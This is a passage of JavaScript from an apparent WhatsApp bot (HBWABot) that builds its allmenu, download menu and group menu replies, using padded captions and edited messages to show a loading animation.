͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
╭═══════════┈
┃𒆜┌───┈
┃𒆜│vipmenu
┃𒆜│allmenu
┃𒆜│aimenu
┃𒆜│mizomenu
┃𒆜│downloadmenu
┃𒆜│groupmenu
┃𒆜│ownermenu
┃𒆜│voicemenu
┃𒆜│stickermenu
┃𒆜│stalkermenu
┃𒆜│audiochanger
┃𒆜│othermenu
┃𒆜└───────────┈ 
╰════════════──┈ `
     if (global.default_language) {
     HBWABotMz.sendMessage(m.chat,{
           image: {
               url: menuthla
           },
           caption1,
           mentions: [m.sender],
           footer: botname,
           buttons: [{
             buttonId: `${prefix}`+"allmenu",
               buttonText: {
                   displayText: "Allmenu"
              }
          },{
             buttonId: `${prefix}`+"owner",
               buttonText: {
                   displayText: "Owner"
              }
          }],
          viewOnce: true,
          headerType: 6,
       }, {quoted: m})
    } else {
         if (global.mtl_language) {
        HBWABotMz.sendMessage(m.chat,{
           image: {
               url: menuthla
           },
           caption2,
           mentions: [m.sender],
           footer: botname,
           buttons: [{
             buttonId: `${prefix}`+"allmenu",
               buttonText: {
                   displayText: "Allmenu"
              }
          },{
             buttonId: `${prefix}`+"owner",
               buttonText: {
                   displayText: "Owner"
              }
          }],
          viewOnce: true,
          headerType: 6,
       }, {quoted: m})
    }
}
}
break

case 'allmenu': {
HBWABotMz.sendMessage(from, { react: { text: "😎" , key: m.key }})
const balance = await eco.balance(limitneihtu, kancoins)
var HBLoadingmenu = [
`《▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒》0%`,
`《███████████▒▒▒▒》80%`,
`《███████████████》100%`,
`╭══════════════
┃ *${global.botname} Allmenu*
┃ *⛃ Coins :* ${balance.wallet}
┃ *♕  VIP :* ${aActiveEm}
╰══════════════
͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
*╭═══❏ AI Menu ❏*
┃𒆜┌───┈
┃𒆜│${prefix}remini
┃𒆜│${prefix}toanime
┃𒆜│${prefix}tozombie
┃𒆜│${prefix}shazam
┃𒆜│${prefix}shazam2
┃𒆜│${prefix}shazam3
┃𒆜│${prefix}autoai on/off
┃𒆜│${prefix}openai [Mizo Language]
┃𒆜│${prefix}gpt [English Language]
┃𒆜│${prefix}ai [Mizo Language]
┃𒆜│${prefix}ai2 [English Language]
┃𒆜│${prefix}gai [Mizo Language]
┃𒆜└───────────┈ 
╰══════════════𖡛

*╭═══❏ Owner Menu ❏*
┃𒆜┌───┈
┃𒆜│${prefix}setdpbot
┃𒆜│${prefix}setdpbot2
┃𒆜│${prefix}addvn
┃𒆜│${prefix}changelang
┃𒆜│${prefix}junkclean
┃𒆜│${prefix}statusaudio
┃𒆜│${prefix}statusvideo
┃𒆜│${prefix}statusimage
┃𒆜│${prefix}statustext
┃𒆜└───────────┈ 
╰══════════════𖡛

*╭═══❏ Download Menu ❏*
┃𒆜┌───┈
┃𒆜│${prefix}play 
┃𒆜│${prefix}ytmp3 
┃𒆜│${prefix}ytaudio
┃𒆜│${prefix}ytmp4 
┃𒆜│${prefix}dsong
┃𒆜│${prefix}dvideo
┃𒆜│${prefix}dsong2
┃𒆜│${prefix}song2 
┃𒆜│${prefix}igvid [insta]
┃𒆜│${prefix}ttvid [tiktok]
┃𒆜│${prefix}ptvid [pinterest]
┃𒆜│${prefix}twvid [twitter]
┃𒆜│${prefix}trvid [threads]
┃𒆜│${prefix}fbvid [facebook]
┃𒆜│${prefix}gdrive 
┃𒆜│${prefix}ringtone 
┃𒆜└───────────┈ 
╰══════════════𖡛

*╭═══❏ Audio Changer❏*
┃𒆜┌───┈
┃𒆜│${prefix}robot
┃𒆜│${prefix}bass
┃𒆜│${prefix}nightcore
┃𒆜│${prefix}deep
┃𒆜│${prefix}fast
┃𒆜│${prefix}slow
┃𒆜│${prefix}reverse
┃𒆜│${prefix}blown
┃𒆜│${prefix}smooth
┃𒆜│${prefix}squirrel
┃𒆜│${prefix}errape
┃𒆜│${prefix}fat
┃𒆜└───────────┈ 
╰══════════════𖡛

*╭═══❏ Group Menu ❏*
┃𒆜┌───┈
┃𒆜│${prefix}group open
┃𒆜│${prefix}group clos
┃𒆜│${prefix}grouplink 
┃𒆜│${prefix}add 
┃𒆜│${prefix}kick 
┃𒆜│${prefix}hidetag 
┃𒆜│${prefix}check
┃𒆜│${prefix}setgrdp
┃𒆜│${prefix}mawl ber
┃𒆜│${prefix}sual ber
┃𒆜│${prefix}fing ber
┃𒆜│${prefix}a ber
┃𒆜│${prefix}tawngthei ber
┃𒆜│${prefix}hmelchhe ber
┃𒆜│${prefix}damrei ber
┃𒆜│${prefix}dawih ber
┃𒆜│${prefix}hrisel ber
┃𒆜│${prefix}upa ber
┃𒆜│${prefix}naupang ber
┃𒆜│${prefix}hmeltha ber
┃𒆜│${prefix}lulian ber
┃𒆜│${prefix}zaktheilo ber
┃𒆜│${prefix}zakzum ber
┃𒆜│${prefix}nawi ber
┃𒆜│${prefix}tawngthei ber
┃𒆜│${prefix}mifel ber
┃𒆜│${prefix}chawheh ber
┃𒆜│${prefix}bumhmang ber
┃𒆜│${prefix}lerh ber
┃𒆜│${prefix}luck ber
┃𒆜│${prefix}zei ber 
┃𒆜└───────────┈ 
╰══════════════𖡛

*╭═══❏ Voice Menu ❏*
┃𒆜┌───┈
┃𒆜│${prefix}tovn
┃𒆜│${prefix}tts
┃𒆜│${prefix}tts2
┃𒆜│${prefix}tts3
┃𒆜│${prefix}tts4
┃𒆜│${prefix}tts5
┃𒆜│${prefix}tts6
┃𒆜│${prefix}tts7
┃𒆜│${prefix}tts8
┃𒆜│${prefix}tts9
┃𒆜│${prefix}tts10
┃𒆜│${prefix}alto
┃𒆜│${prefix}tenor
┃𒆜│${prefix}sunshine
┃𒆜│${prefix}warmy
┃𒆜│${prefix}glorious
┃𒆜│${prefix}itgoesup
┃𒆜│${prefix}chipmunk
┃𒆜│${prefix}dramatic
┃𒆜└───────────┈ 
╰══════════════𖡛

*╭═══❏ Other Menu ❏*
┃𒆜┌───┈
┃𒆜│${prefix}wadl
┃𒆜│${prefix}vodl
┃𒆜│${prefix}spin1
┃𒆜│${prefix}checkme
┃𒆜│${prefix}list tobebot
┃𒆜│${prefix}how tobebot
┃𒆜│${prefix}buycoin
┃𒆜│${prefix}spin
┃𒆜│${prefix}transfer
┃𒆜│${prefix}daily
┃𒆜│${prefix}gamble
┃𒆜│${prefix}withdraw
┃𒆜│${prefix}deposite
┃𒆜│${prefix}tinyurl 
┃𒆜│${prefix}tovn 
┃𒆜│${prefix}toaudio 
┃𒆜│${prefix}tomp3 
┃𒆜│${prefix}toimg
┃𒆜│${prefix}ebinary 
┃𒆜│${prefix}dbinary  
┃𒆜│${prefix}translate
┃𒆜│${prefix}ping
┃𒆜│${prefix}runtime
┃𒆜│${prefix}swm
┃𒆜│${prefix}sc
┃𒆜└───────────┈ 
╰══════════════𖡛`]
const { key } = await HBWABotMz.sendMessage(m.chat, {
      image: fs.readFileSync('./asset/image/HBWABot.png'),
      caption: '《▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒》0%\n♻️ _Nghak lawk rawh.._'
    }, {quoted: m})
for (let i = 0; i < HBLoadingmenu.length; i++) {
await HBWABotMz.relayMessage(m.chat, {
        protocolMessage: {
          key,
          type: 14,
          editedMessage: {
           imageMessage: { caption: HBLoadingmenu[i] }
          }
        }
      }, {})
 }
}
break
*/
case 'downloadmenu': {
 
const balance = await eco.balance(limitneihtu, kancoins)
HBWABotMz.sendMessage(from, { react: { text: "🤖️" , key: m.key }})
var HBLoadingmenu = [
`《▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒》0%`,
`《███████████▒▒▒▒》80%`,
`《███████████████》100%`,
`╭══════════════
┃ *Download Menu*
┃ *⛃ Coins :* ${balance.wallet}
┃ *♕  VIP :* ${aActiveEm}
╰══════════════
͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
*╭═══❏ Download Menu ❏*
┃𒆜┌───┈
┃𒆜│${prefix}play 
┃𒆜│${prefix}ytmp3 
┃𒆜│${prefix}ytaudio
┃𒆜│${prefix}ytmp4 
┃𒆜│${prefix}dsong
┃𒆜│${prefix}dvideo
┃𒆜│${prefix}dsong2
┃𒆜│${prefix}song2 
┃𒆜│${prefix}igvid [insta]
┃𒆜│${prefix}igpic [insta]
┃𒆜│${prefix}igstory [insta]
┃𒆜│${prefix}igtv [insta]
┃𒆜│${prefix}ttvid [tiktok]
┃𒆜│${prefix}ptvid [pinterest]
┃𒆜│${prefix}twvid [twitter]
┃𒆜│${prefix}trvid [threads]
┃𒆜│${prefix}fbvid [facebook]
┃𒆜│${prefix}gdrive 
┃𒆜│${prefix}ringtone 
┃𒆜└───────────┈ 
╰══════════════𖡛`]
const { key } = await HBWABotMz.sendMessage(m.chat, {
      image: fs.readFileSync("./asset/image/HBWABot.png"),
      caption: '《▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒》0%\n♻️ _Nghak lawk rawh.._'
    }, {quoted: m})
for (let i = 0; i < HBLoadingmenu.length; i++) {
await HBWABotMz.relayMessage(m.chat, {
        protocolMessage: {
          key,
          type: 14,
          editedMessage: {
           imageMessage: { caption: HBLoadingmenu[i] }
          }
        }
      }, {})
 }
}
break
case 'groupmenu': {
 
const balance = await eco.balance(limitneihtu, kancoins)
HBWABotMz.sendMessage(from, { react: { text: "🤖️" , key: m.key }})
var HBLoadingmenu = [
`《▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒》0%`,
`《███████████▒▒▒▒》80%`,
`《███████████████》100%`,
`╭══════════════
┃ *Group Menu*
┃ *⛃ Coins :* ${balance.wallet}
┃ *♕  VIP :* ${aActiveEm}
╰══════════════
͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
*╭═══❏ Group Menu ❏*
┃𒆜┌───┈
┃𒆜│${prefix}group close 
┃𒆜│${prefix}group open
┃𒆜│${prefix}grouplink 
┃𒆜│${prefix}add 
┃𒆜│${prefix}kick 
┃𒆜│${prefix}hidetag 
┃𒆜│${prefix}check
┃𒆜│${prefix}setgrdp
┃𒆜│${prefix}mawl ber
┃𒆜│${prefix}sual ber
┃𒆜│${prefix}fing ber
┃𒆜│${prefix}a ber
┃𒆜│${prefix}tawngthei ber
┃𒆜│${prefix}hmelchhe ber
┃𒆜│${prefix}damrei ber
┃𒆜│${prefix}dawih ber
┃𒆜│${prefix}hrisel ber
┃𒆜│${prefix}upa ber
┃𒆜│${prefix}naupang ber
┃𒆜│${prefix}hmeltha ber
┃𒆜│${prefix}lulian ber
┃𒆜│${prefix}zaktheilo ber
┃𒆜│${prefix}zakzum ber
┃𒆜│${prefix}nawi ber
┃𒆜│${prefix}tawngthei ber
┃𒆜│${prefix}mifel ber
┃𒆜│${prefix}chawheh ber
┃𒆜│${prefix}bumhmang ber
┃𒆜│${prefix}lerh ber
┃𒆜│${prefix}luck ber
┃𒆜│${prefix}zei ber 
┃𒆜└───────────┈ 
╰══════════════𖡛`]
const { key } = await HBWABotMz.sendMessage(m.chat, {
